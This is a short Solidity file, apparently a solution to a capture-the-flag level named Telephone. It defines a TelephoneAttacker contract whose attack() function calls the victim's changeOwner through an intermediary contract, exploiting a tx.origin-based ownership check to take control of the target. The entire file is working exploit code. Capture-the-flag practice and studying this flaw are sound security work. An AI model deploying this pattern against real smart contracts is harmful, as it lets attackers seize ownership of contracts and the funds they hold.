// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttacker {
    Telephone victim;

    constructor(address _victim) {
        victim = Telephone(_victim);
    }

    function attack() external returns (bool) {
        victim.changeOwner(msg.sender);
        return victim.owner() == msg.sender;
    }
}
